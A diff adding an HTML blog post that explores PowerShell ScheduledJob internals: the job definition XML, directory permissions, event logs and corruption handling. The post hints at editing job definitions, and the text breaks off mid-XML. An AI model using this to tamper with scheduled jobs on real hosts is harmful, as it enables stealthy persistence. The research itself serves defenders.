@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Windows Scheduled Job | shark-asmx</title>
+<link rel="icon" href="/favicon.svg" sizes="any" type="image/svg+xml" /><meta property="og:url" content="http://localhost:1313/posts/windows-scheduled-job/windows-scheduled-job/">
+	<meta property="og:site_name" content="shark-asmx">
+	<meta property="og:title" content="Windows Scheduled Job">
+	<meta property="og:description" content="Windows Scheduled Job We mostly see Windows Scheduled Tasks creation, and usually deal with tasks associated with the Task Scheduler service. It utilizes RPC Interface (i.e., ITaskSchedulerService) to create, run, and modify them.
+However, there is a special part of scheduled tasks that acts like a proxy (using this term for convenience).
+In short, ScheduledJob is used to manage scheduled jobs in Windows PowerShell, while PSScheduledJob is the module that provides this functionality.">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2026-08-25T06:34:30+05:30">
+		<meta property="article:modified_time" content="2026-08-25T06:34:30+05:30">
+
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:title" content="Windows Scheduled Job">
+	<meta name="twitter:description" content="Windows Scheduled Job We mostly see Windows Scheduled Tasks creation, and usually deal with tasks associated with the Task Scheduler service. It utilizes RPC Interface (i.e., ITaskSchedulerService) to create, run, and modify them.
+However, there is a special part of scheduled tasks that acts like a proxy (using this term for convenience).
+In short, ScheduledJob is used to manage scheduled jobs in Windows PowerShell, while PSScheduledJob is the module that provides this functionality.">
+
+    <link rel="stylesheet" href="/css/root.css">
+    <link rel="stylesheet" href="/css/bundle.css">
+
+      <script src="/js/bundle.js"></script><script defer src="/js/search/flexsearch.compact.3928d3d2172bc0b5f75d9458fb9255f0befce1c7239ba6e5d2c58ed4b82c2073.js" integrity="sha256-OSjT0hcrwLX3XZRY&#43;5JV8L784ccjm6bl0sWO1LgsIHM="></script>
+<script defer src="/js/search/search.1d980f84df11f3eb7c8c5f17f541d49a0611608df179dd74fa7f06225eb56ace.js" integrity="sha256-HZgPhN8R8&#43;t8jF8X9UHUmgYRYI3xed10&#43;n8GIl61as4="></script>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,200..800&display=swap" rel="stylesheet">
+
+</head>
+<body class="notransition">
+  <div id="aside-overlay"></div>
+  <div id="container">
+    <header id="main-header"><div role="navigation" aria-label="Main">
+  <div class="nav-left">
+    <a href="http://localhost:1313/" style="color: inherit;">shark-asmx</a>
+  </div>
+  <div class="nav-right">
+    <div style="position:absolute;width:0px;height:0px;">
+      <div id="nav-dropdown-menu" class="hidden" href="#">
+    <div class="nav-item">
+      <a href="/posts"
+      >posts</a>
+    </div>
+</div>
+    </div>
+    <a id="nav-dropdown-button" href="#"><svg width="20px" height="20px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M4 6H20M4 12H20M4 18H20" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+</svg>
+</a>
+    <div id="nav-menu">
+    <div class="nav-item">
+      <a href="/posts"
+      >posts</a>
+    </div>
+</div>
+    <a id="theme-switcher" href="#">
+<svg class="light-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M12 3V4M12 20V21M4 12H3M6.31412 6.31412L5.5 5.5M17.6859 6.31412L18.5 5.5M6.31412 17.69L5.5 18.5001M17.6859 17.69L18.5 18.5001M21 12H20M16 12C16 14.2091 14.2091 16 12 16C9.79086 16 8 14.2091 8 12C8 9.79086 9.79086 8 12 8C14.2091 8 16 9.79086 16 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+</svg>
+
+<svg class="dark-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M3.32031 11.6835C3.32031 16.6541 7.34975 20.6835 12.3203 20.6835C16.1075 20.6835 19.3483 18.3443 20.6768 15.032C19.6402 15.4486 18.5059 15.6834 17.3203 15.6834C12.3497 15.6834 8.32031 11.654 8.32031 6.68342C8.32031 5.50338 8.55165 4.36259 8.96453 3.32996C5.65605 4.66028 3.32031 7.89912 3.32031 11.6835Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+</svg>
+</a>
+  </div>
+</div>
+</header>
+    <div class="flex grow">
+      <div id="main-pane">
+        <main id="main-content"><div class="single-header">
+<ol class="breadcrumbs" itemscope itemtype="https://schema.org/BreadcrumbList">
+    <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+      <a itemprop="item" href="http://localhost:1313/">
+        <span itemprop="name">Home</span>
+      </a>
+      <meta itemprop="position" content='1' />
+    </li>
+    <span>&nbsp»&nbsp</span>
+    <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+      <a itemprop="item" href="http://localhost:1313/posts/">
+        <span itemprop="name">Posts</span>
+      </a>
+      <meta itemprop="position" content='2' />
+    </li>
+    <span>&nbsp»&nbsp</span>
+</ol>
+<h1>Windows Scheduled Job</h1><time class="dim" datetime="2026-08-25T06:34:30&#43;05:30">August 25, 2026</time></div>
+  <section class="page-section"><h2 id="windows-scheduled-job">Windows Scheduled Job</h2>
+<p>We mostly see Windows Scheduled Tasks creation, and usually deal with tasks associated with the Task Scheduler service. It utilizes RPC Interface (i.e., <code>ITaskSchedulerService</code>) to create, run, and modify them.</p>
+<p>However, there is a special part of scheduled tasks that acts like a proxy (using this term for convenience).</p>
+<p>In short, ScheduledJob is used to manage scheduled jobs in Windows PowerShell, while PSScheduledJob is the module that provides this functionality.</p>
+<p>Starting PowerShell 7, PSCore Team has disabled this module</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PS C:<span class="se">\P</span>rogram Files<span class="se">\P</span>owerShell<span class="se">\7\M</span>odules<span class="se">\M</span>icrosoft.PowerShell.Security&gt; cat <span class="s2">&#34;C:\Program Files\PowerShell\7\powershell.config.json&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;Microsoft.PowerShell:ExecutionPolicy&#34;</span>: <span class="s2">&#34;RemoteSigned&#34;</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;WindowsPowerShellCompatibilityModuleDenyList&#34;</span>: <span class="o">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;PSScheduledJob&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;BestPractices&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;UpdateServices&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>They added <code>PSScheduledJob</code> module in denylist and almost about to remove the code support for it. This may not work in &gt; v7.0, so we’ll be sticking with the older version for now (v5.0)</p>
+<p><strong>Understanding the ScheduledJob</strong></p>
+<p>Let&rsquo;s create a simple scheduled task/job</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\s</span>hark&gt; <span class="nv">$trigger</span> <span class="o">=</span> New-JobTrigger -Once -At <span class="o">((</span>Get-Date<span class="o">)</span>.AddMinutes<span class="o">(</span>2<span class="o">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\s</span>hark&gt; Register-ScheduledJob -Name <span class="s2">&#34;shark-job-testing-1&#34;</span>  -Trigger <span class="nv">$trigger</span> -ScriptBlock <span class="o">{</span> Start-Process notepad.exe <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Id         Name            JobTriggers     Command                                  Enabled
+</span></span><span class="line"><span class="cl">--         ----            -----------     -------                                  -------
+</span></span><span class="line"><span class="cl"><span class="m">1</span>          shark-job-te... <span class="m">1</span>                Start-Process notepad.exe               True
+</span></span></code></pre></div><p>Once the two-minute timer hits, it launches <code>notepad.exe</code> and writes the output details to the following path:</p>
+<ul>
+<li>C:\Users\shark\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs</li>
+</ul>
+<p>Inspect the files:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sh4rk ScheduledJobs/shark-job-testing-1 &gt;  tree
+</span></span><span class="line"><span class="cl">.
+</span></span><span class="line"><span class="cl">├── Output
+</span></span><span class="line"><span class="cl">│  └── 20260805-085612-972
+</span></span><span class="line"><span class="cl">│                 ├── Results.xml
+</span></span><span class="line"><span class="cl">│                 └── Status.xml
+</span></span><span class="line"><span class="cl">└── ScheduledJobDefinition.xml // definition <span class="k">for</span> this job
+</span></span></code></pre></div><p>It creates a subdirectory inside the output folder with the timestamp which further contains the two files i.e. Results and Status.</p>
+<p><strong>Note</strong></p>
+<p>Permission to the directory:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\s</span>hark<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\S</span>cheduledJobs NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                                                                        BUILTIN<span class="se">\A</span>dministrators:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                                                                        SH4RK<span class="se">\s</span>hark:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
+</span></span></code></pre></div><p>The user who created the task has full access, so we can modify it? Huh… interesting.</p>
+<p>After analysing the configuration file, I found it quite interesting and decided to modify it. I changed a few parameters and found the results even more interesting.</p>
+<h3 id="intrinsic-of-scheduledjob">Intrinsic of ScheduledJob</h3>
+<p>We will begin with creating a simple task and understand the dynamics of it.</p>
+<p>In ScheduledJobDefinition file, we can see the list of values like:</p>
+<ul>
+<li>Invocation Command</li>
+<li>Output File Path</li>
+<li>FilePath</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;InvocationInfo_Command</span> <span class="na">z:Id=</span><span class="s">&#34;38&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.String&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span> 
+</span></span><span class="line"><span class="cl">        Start-Process notepad.exe
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/InvocationInfo_Command&gt;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Get-ScheduledJob <span class="p">|</span> fl
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">InvocationInfo         : Microsoft.PowerShell.ScheduledJob.ScheduledJobInvocationInfo
+</span></span><span class="line"><span class="cl">Definition             : System.Management.Automation.JobDefinition
+</span></span><span class="line"><span class="cl">Options                : Microsoft.PowerShell.ScheduledJob.ScheduledJobOptions
+</span></span><span class="line"><span class="cl">Credential             :
+</span></span><span class="line"><span class="cl">JobTriggers            : <span class="o">{</span>1<span class="o">}</span>
+</span></span><span class="line"><span class="cl">Id                     : <span class="m">1</span>
+</span></span><span class="line"><span class="cl">GlobalId               : 39bf57d3-0b83-4b29-8d19-6792fcd1338e
+</span></span><span class="line"><span class="cl">Name                   : shark-job-testing-1
+</span></span><span class="line"><span class="cl">Command                :  Start-Process notepad.exe
+</span></span><span class="line"><span class="cl">ExecutionHistoryLength : <span class="m">32</span>
+</span></span><span class="line"><span class="cl">Enabled                : True
+</span></span><span class="line"><span class="cl">PSExecutionPath        : powershell.exe
+</span></span><span class="line"><span class="cl">PSExecutionArgs        : -NoLogo -NonInteractive -WindowStyle Hidden -Command <span class="s2">&#34;Import-Module PSScheduledJob; </span><span class="nv">$jobDef</span><span class="s2"> =
+</span></span></span><span class="line"><span class="cl"><span class="s2">                        [Microsoft.PowerShell.ScheduledJob.ScheduledJobDefinition]::LoadFromStore(&#39;shark-job-testing-1
+</span></span></span><span class="line"><span class="cl"><span class="s2">                        &#39;, &#39;C:\Users\shark\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs&#39;); </span><span class="nv">$jobDef</span><span class="s2">.Run()&#34;</span>     
+</span></span></code></pre></div><p>In the above, we can see the command which is getting pulled from <code>InvocationInfo_Command</code>. However, there is one more tag which is more interesting to us.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;InvocationParam_ScriptBlock</span>
+</span></span><span class="line"><span class="cl">            <span class="na">z:Id=</span><span class="s">&#34;41&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="na">z:Type=</span><span class="s">&#34;System.String&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&gt;</span> Start-Process notepad.exe <span class="nt">&lt;/InvocationParam_ScriptBlock&gt;</span>
+</span></span></code></pre></div><p>While execution, it reads the value from this tag <code>InvocationParam_ScriptBlock</code>. So, analysing the  through the terminal may not always give correct output. It would be better to review the file directly rather than relying solely on the command ou</p>
+<p>Triggering this task</p>
+<p><img src="/posts/windows-scheduled-job/images/img1.png" alt="Img1"></p>
+<p>Check <code>Powershell</code> Operational logs (event ids: 403, 600), if something has been invoked during that timeframe.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Provider <span class="s2">&#34;Registry&#34;</span> is Started. 
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="nv">HostName</span><span class="o">=</span>ConsoleHost
+</span></span><span class="line"><span class="cl"> <span class="nv">HostVersion</span><span class="o">=</span>5.1.26100.8972
+</span></span><span class="line"><span class="cl"> <span class="nv">HostId</span><span class="o">=</span>85ea544d-9b28-4284-871f-2679f5147314
+</span></span><span class="line"><span class="cl"> <span class="nv">HostApplication</span><span class="o">=</span>powershell.exe -NoLogo -NonInteractive -WindowStyle Hidden -Command Import-Module PSScheduledJob<span class="p">;</span> <span class="nv">$jobDef</span> <span class="o">=</span> <span class="o">[</span>Microsoft.PowerShell.ScheduledJob.ScheduledJobDefinition<span class="o">]</span>::LoadFromStore<span class="o">(</span><span class="s1">&#39;shark-job-testing-1&#39;</span>, <span class="s1">&#39;C:\Users\shark\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs&#39;</span><span class="o">)</span><span class="p">;</span> <span class="nv">$jobDef</span>.Run<span class="o">()</span>
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></div><p>We can see the parameters:</p>
+<ul>
+<li>Task-Name: <code>shark-job-testing-1</code></li>
+</ul>
+<p>Corrupt the xml file and then attempting to either check the status or start the job. It loads the xml file and performs deserialization and during which it throws an error, marks the file as corrupted, and subsequently deletes it during clean up operation.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Start-Job -DefinitionName <span class="s1">&#39;shark-job-testing-1&#39;</span>
+</span></span><span class="line"><span class="cl">WARNING: A PSScheduledJob job <span class="nb">source</span> adapter threw an exception with the following message: Cannot get the
+</span></span><span class="line"><span class="cl">shark-job-testing-1 scheduled job because it is corrupted or in an irresolvable state. Because it cannot run, Windows
+</span></span><span class="line"><span class="cl">PowerShell has deleted shark-job-testing-1 and its results from the computer. To recreate the scheduled job, use the
+</span></span><span class="line"><span class="cl">Register-ScheduledJob cmdlet. For more information about corrupted scheduled jobs, see
+</span></span><span class="line"><span class="cl">about_Scheduled_Jobs_Troubleshooting.
+</span></span><span class="line"><span class="cl">Start-Job : Cannot find a scheduled job with name shark-job-testing-1.
+</span></span><span class="line"><span class="cl">At line:1 char:1
+</span></span><span class="line"><span class="cl">+ Start-Job -DefinitionName <span class="s1">&#39;shark-job-testing-1&#39;</span>
+</span></span><span class="line"><span class="cl">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+</span></span><span class="line"><span class="cl">    + CategoryInfo          : ObjectNotFound: <span class="o">(</span>:<span class="o">)</span> <span class="o">[</span>Start-Job<span class="o">]</span>, RuntimeException
+</span></span><span class="line"><span class="cl">    + FullyQualifiedErrorId : StartJobFromDefinitionNameNotFound,Microsoft.PowerShell.Commands.StartJobCommand
+</span></span></code></pre></div><p>These checks determine whether the file is valid; if any fail, the file is marked as corrupt.</p>
+<ul>
+<li><code>FileNotFoundException</code></li>
+<li><code>SerializationException</code></li>
+<li><code>System.Runtime.Serialization.InvalidDataContractException</code></li>
+<li><code>System.Xml.XmlException</code></li>
+<li><code>System.TypeInitializationException</code></li>
+</ul>
+<p>Let’s examine these XML files in detail.</p>
+<ul>
+<li>Name: <code>ScheduledJobDefinition.xml</code></li>
+<li>Path: <code>C:\Users\shark\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs\shark-job-testing-1\ScheduledJobDefinition.xml</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;ScheduledJobDefinition</span> <span class="na">z:Id=</span><span class="s">&#34;1&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;Microsoft.PowerShell.ScheduledJob.ScheduledJobDefinition&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;Microsoft.PowerShell.ScheduledJob, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;http://schemas.datacontract.org/2004/07/Microsoft.PowerShell.ScheduledJob&#34;</span> <span class="na">xmlns:i=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span class="na">xmlns:x=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema&#34;</span> <span class="na">xmlns:z=</span><span class="s">&#34;http://schemas.microsoft.com/2003/10/Serialization/&#34;</span><span class="nt">&gt;&lt;Options_Member</span> <span class="na">z:Id=</span><span class="s">&#34;2&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;Microsoft.PowerShell.ScheduledJob.ScheduledJobOptions&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;Microsoft.PowerShell.ScheduledJob, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;&lt;StartIfOnBatteries_Value</span> <span class="na">z:Id=</span><span class="s">&#34;3&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.Boolean&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>false<span class="nt">&lt;/StartIfOnBatteries_Value&gt;&lt;StopIfGoingOnBatteries_Value</span> <span class="na">z:Id=</span><span class="s">&#34;4&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.Boolean&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>true<span class="nt">&lt;/StopIfGoingOnBatteries_Value&gt;&lt;WakeToRun_Value</span> <span class="na">z:Id=</span><span class="s">&#34;5&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.Boolean&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>false<span class="nt">&lt;/WakeToRun_Value&gt;&lt;StartIfNotIdle_Value</span> <span class="na">z:Id=</span><span class="s">&#34;6&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.Boolean&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>true<span class="nt">&lt;/StartIfNotIdle_Value&gt;&lt;StopIfGoingOffIdle_Value</span> <span class="na">z:Id=</span><span class="s">&#34;7&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.Boolean&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>false<span class="nt">&lt;/StopIfGoingOffIdle_Value&gt;&lt;RestartOnIdleResume_Value</span> <span class="na">z:Id=</span><span class="s">&#34;8&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.Boolean&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>false<span class="nt">&lt;/RestartOnIdleResume_Value&gt;&lt;IdleDuration_Value</span> <span class="na">z:Id=</span><span class="s">&#34;9&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.TimeSpan&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>PT10M<span class="nt">&lt;/IdleDuration_Value&gt;&lt;IdleTimeout_Value</span> <span class="na">z:Id=</span><span class="s">&#34;10&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.TimeSpan&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>PT1H<span class="nt">&lt;/IdleTimeout_Value&gt;&lt;ShowInTaskScheduler_Value</span> <span class="na">z:Id=</span><span class="s">&#34;11&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.Boolean&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>true<span class="nt">&lt;/ShowInTaskScheduler_Value&gt;&lt;RunElevated_Value</span> <span class="na">z:Id=</span><span class="s">&#34;12&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.Boolean&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>false<span class="nt">&lt;/RunElevated_Value&gt;&lt;RunWithoutNetwork_Value</span> <span class="na">z:Id=</span><span class="s">&#34;13&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.Boolean&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>true<span class="nt">&lt;/RunWithoutNetwork_Value&gt;&lt;DoNotAllowDemandStart_Value</span> <span class="na">z:Id=</span><span class="s">&#34;14&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.Boolean&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>false<span class="nt">&lt;/DoNotAllowDemandStart_Value&gt;&lt;TaskMultipleInstancePolicy_Value</span> <span class="na">z:Id=</span><span class="s">&#34;15&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;Microsoft.PowerShell.ScheduledJob.TaskMultipleInstancePolicy&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;Microsoft.PowerShell.ScheduledJob, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#34;</span><span class="nt">&gt;</span>IgnoreNew<span class="nt">&lt;/TaskMultipleInstancePolicy_Value&gt;&lt;/Options_Member&gt;&lt;GlobalId_Member</span> <span class="na">z:Id=</span><span class="s">&#34;16&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.String&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;</span>0e953355-6b96-4f9f-b2e8-49514d03a69f<span class="nt">&lt;/GlobalId_Member&gt;&lt;Name_Member</span> <span class="na">z:Id=</span><span class="s">&#34;17&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.String&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;</span>shark-job-testing-1<span class="nt">&lt;/Name_Member&gt;&lt;HistoryLength_Member</span> <span class="na">z:Id=</span><span class="s">&#34;18&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.Int32&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;</span>32<span class="nt">&lt;/HistoryLength_Member&gt;&lt;Enabled_Member</span> <span class="na">z:Id=</span><span class="s">&#34;19&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.Boolean&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;</span>true<span class="nt">&lt;/Enabled_Member&gt;&lt;Triggers_Member</span> <span class="na">z:Id=</span><span class="s">&#34;20&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.Collections.Generic.Dictionary`2[[System.Int32, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[Microsoft.PowerShell.ScheduledJob.ScheduledJobTrigger, Microsoft.PowerShell.ScheduledJob, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]]&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;&lt;Version</span> <span class="na">z:Id=</span><span class="s">&#34;21&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.Int32&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>1<span class="nt">&lt;/Version&gt;&lt;Comparer</span> <span class="na">z:Id=</span><span class="s">&#34;22&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.Collections.Generic.GenericEqualityComparer`1[[System.Int32, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span><span class="nt">/&gt;&lt;HashSize</span> <span class="na">z:Id=</span><span class="s">&#34;23&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.Int32&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>3<span class="nt">&lt;/HashSize&gt;&lt;KeyValuePairs</span> <span class="na">z:Id=</span><span class="s">&#34;24&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.Collections.Generic.KeyValuePair`2[[System.Int32, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[Microsoft.PowerShell.ScheduledJob.ScheduledJobTrigger, Microsoft.PowerShell.ScheduledJob, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]][]&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span> <span class="na">z:Size=</span><span class="s">&#34;1&#34;</span><span class="nt">&gt;&lt;KeyValuePairOfintScheduledJobTrigger0k6IGDQ3</span> <span class="na">xmlns=</span><span class="s">&#34;http://schemas.datacontract.org/2004/07/System.Collections.Generic&#34;</span><span class="nt">&gt;&lt;key&gt;</span>1<span class="nt">&lt;/key&gt;&lt;value</span> <span class="na">z:Id=</span><span class="s">&#34;25&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;Microsoft.PowerShell.ScheduledJob.ScheduledJobTrigger&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;Microsoft.PowerShell.ScheduledJob, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#34;</span> <span class="na">xmlns:a=</span><span class="s">&#34;http://schemas.datacontract.org/2004/07/Microsoft.PowerShell.ScheduledJob&#34;</span><span class="nt">&gt;&lt;Time_Value</span> <span class="na">z:Id=</span><span class="s">&#34;26&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.DateTime&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;</span>2026-08-19T06:35:27<span class="nt">&lt;/Time_Value&gt;&lt;RepetitionInterval_Value</span> <span class="na">z:Id=</span><span class="s">&#34;27&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.TimeSpan&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;</span>PT0S<span class="nt">&lt;/RepetitionInterval_Value&gt;&lt;RepetitionDuration_Value</span> <span class="na">z:Id=</span><span class="s">&#34;28&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.TimeSpan&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;</span>PT0S<span class="nt">&lt;/RepetitionDuration_Value&gt;&lt;DaysOfWeek_Value</span> <span class="na">i:nil=</span><span class="s">&#34;true&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;&#34;</span><span class="nt">/&gt;&lt;RandomDelay_Value</span> <span class="na">z:Id=</span><span class="s">&#34;29&#34;</span> <span 